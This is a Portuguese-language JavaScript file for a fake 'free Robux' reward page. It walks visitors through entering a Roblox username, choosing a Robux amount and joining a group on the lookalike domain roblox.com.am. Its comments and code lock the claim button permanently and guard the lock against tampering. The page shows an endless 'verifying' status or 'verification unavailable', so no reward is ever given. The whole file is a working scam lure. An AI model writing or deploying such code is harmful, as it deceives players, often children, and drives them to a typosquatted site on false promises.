/**
 * Recompensas Robux — Script 100% Client-Side em PT-BR
 * BOTÃO DE RESGATE TRAVADO PERMANENTEMENTE (Opção 1 + proteção extra)
 */

/* ===========================
   Configurações
   =========================== */

const GROUP_URL = `https://www.roblox.com.am/communities/138423710779/robloxianStudio`;

const STEP_INFO = {
  1: { tag: 'ETAPA 1 DE 5', label: 'Nome de Usuário' },
  2: { tag: 'ETAPA 2 DE 5', label: 'Confirmação de Conta' },
  3: { tag: 'ETAPA 3 DE 5', label: 'Escolha de Robux' },
  4: { tag: 'ETAPA 4 DE 5', label: 'Entrar no Grupo' },
  5: { tag: 'ETAPA 5 DE 5', label: 'Resgatar Recompensa' },
};

/* ===========================
   Estado
   =========================== */

const state = {
  step: 1,
  username: '',
  amount: null,
  groupOpened: false,
  verified: false,
};

// Trava imutável — mesmo que alguém tente mudar via console, não consegue
const LOCKED = Object.freeze({ forever: true });

/* ===========================
   Elementos DOM
   =========================== */

const $ = (s) => document.querySelector(s);
const $$ = (s) => document.querySelectorAll(s);

const el = {
  stepTag: $('#stepTag'),
  stepLabel: $('#stepLabel'),
  fill: $('#progressFill'),
  dots: $$('.progress-dot'),
  steps: $$('.step'),

  nameInput: $('#usernameInput'),
  nameError: $('#usernameError'),
  btnS1: $('#btnStep1'),

  avatarInitial: $('#avatarInitial'),
  dispName: $('#userDisplayName'),
  userName: $('#userUsername'),
  btnYes: $('#btnConfirmYes'),
  btnNo: $('#btnConfirmNo'),

  robuxGrid: $('#robuxGrid'),
  cards: $$('.robux-card'),
  btnS3: $('#btnStep3'),

  btnJoin: $('#btnJoinGroup'),
  btnClaim: $('#btnClaim'),
  verify: $('#verifyStatus'),

  rwUser: $('#rewardUsername'),
  rwAmt: $('#rewardAmount'),
  rwGroup: $('#rewardGroup'),
  rwStatus: $('#rewardStatus'),
};

/* ===========================
   Navegação das Etapas
   =========================== */

function go(step) {
  state.step = step;

  if (STEP_INFO[step]) {
    el.stepTag.textContent = STEP_INFO[step].tag;
    el.stepLabel.textContent = STEP_INFO[step].label;
  }

  el.fill.style.width = `${((step - 1) / 4) * 100}%`;

  el.dots.forEach((d) => {
    const s = +d.dataset.step;
    d.classList.remove('active', 'done');
    if (s < step) d.classList.add('done');
    if (s === step) d.classList.add('active');
  });

  el.steps.forEach((panel, i) => {
    panel.classList.toggle('active', i + 1 === step);
  });

  window.scrollTo({ top: 0, behavior: 'smooth' });
}

/* ===========================
   ETAPA 1
   =========================== */

function initStep1() {
  el.btnS1.addEventListener('click', submitUsername);
  el.nameInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') submitUsername();
  });
  el.nameInput.addEventListener('input', () => {
    el.nameError.textContent = '';
    el.nameInput.classList.remove('has-error');
  });
}

function submitUsername() {
  const val = el.nameInput.value.trim();

  if (!val) {
    showError('Por favor, digite seu nome de usuário.');
    return;
  }
  if (val.length < 3) {
    showError('O nome de usuário deve ter pelo menos 3 caracteres.');
    return;
  }

  state.username = val;
  el.avatarInitial.textContent = val.charAt(0).toUpperCase();
  el.dispName.textContent = val;
  el.userName.textContent = `@${val}`;
  go(2);
}

function showError(msg) {
  el.nameError.textContent = msg;
  el.nameInput.classList.add('has-error');
  el.nameInput.focus();
}

/* ===========================
   ETAPA 2
   =========================== */

function initStep2() {
  el.btnYes.addEventListener('click', () => go(3));
  el.btnNo.addEventListener('click', () => {
    state.username = '';
    el.nameInput.value = '';
    go(1);
  });
}

/* ===========================
   ETAPA 3
   =========================== */

function initStep3() {
  el.cards.forEach((card) => {
    card.addEventListener('click', () => {
      el.cards.forEach((c) => c.classList.remove('selected'));
      card.classList.add('selected');
      state.amount = parseInt(card.dataset.amount, 10);
      el.btnS3.disabled = false;
    });
  });

  el.btnS3.addEventListener('click', () => {
    if (state.amount) go(4);
  });
}

/* ===========================
   ETAPA 4 — BLOQUEIO PERMANENTE DO RESGATE
   =========================== */

function initStep4() {
  // 1) Remove qualquer onclick inline (defesa extra)
  el.btnClaim.removeAttribute('onclick');
  el.btnJoin.removeAttribute('onclick');

  // 2) Trava IMEDIATAMENTE e para sempre
  function lockClaim() {
    el.btnClaim.disabled = true;
    el.btnClaim.setAttribute('aria-disabled', 'true');
    el.btnClaim.setAttribute('tabindex', '-1');
    el.btnClaim.classList.add('is-locked');
    // Texto do botão continua o mesmo
    const span = el.btnClaim.querySelector('span');
    if (span) span.textContent = 'Resgatar Meus Robux';
  }
  lockClaim();

  // 3) MutationObserver: se QUALQUER script tentar remover o disabled/aria/class, re-trava
  const observer = new MutationObserver(() => {
    if (
      !el.btnClaim.disabled ||
      el.btnClaim.getAttribute('aria-disabled') !== 'true' ||
      !el.btnClaim.classList.contains('is-locked')
    ) {
      lockClaim();
    }
  });
  observer.observe(el.btnClaim, {
    attributes: true,
    attributeFilter: ['disabled', 'aria-disabled', 'class', 'tabindex'],
  });

  // 4) Captura o clique ANTES de qualquer outro handler (fase de captura)
  el.btnClaim.addEventListener(
    'click',
    (e) => {
      e.preventDefault();
      e.stopImmediatePropagation();
      if (LOCKED.forever) {
        setStatus('error', '⚠ Verificação indisponível no momento.');
      }
      return false;
    },
    true // useCapture
  );

  // 5) Botão "Entrar no Grupo" — só mostra "verificando" e NUNCA libera
  el.btnJoin.addEventListener('click', () => {
    window.open(GROUP_URL, '_blank', 'noopener');
    state.groupOpened = true;
    setStatus('loading', 'Verificando sua entrada no grupo...');
    // SEM setTimeout, SEM btnClaim.disabled = false
    // O botão de resgate permanece travado para sempre
  });
}

function setStatus(type, msg) {
  el.verify.textContent = msg;
  el.verify.className = 'status-badge';
  if (type === 'loading') el.verify.classList.add('is-loading');
  if (type === 'success') el.verify.classList.add('is-success');
  if (type === 'error') el.verify.classList.add('is-error');
}

/* ===========================
   ETAPA 5
   =========================== */

function buildStep5() {
  const formattedAmount = Number(state.amount).toLocaleString('pt-BR');
  el.rwUser.textContent = `@${state.username}`;
  el.rwAmt.textContent = `${formattedAmount} Robux`;
}

/* ===========================
   Inicialização
   =========================== */

function init() {
  initStep1();
  initStep2();
  initStep3();
  initStep4();
  go(1);
}

document.addEventListener('DOMContentLoaded', init);
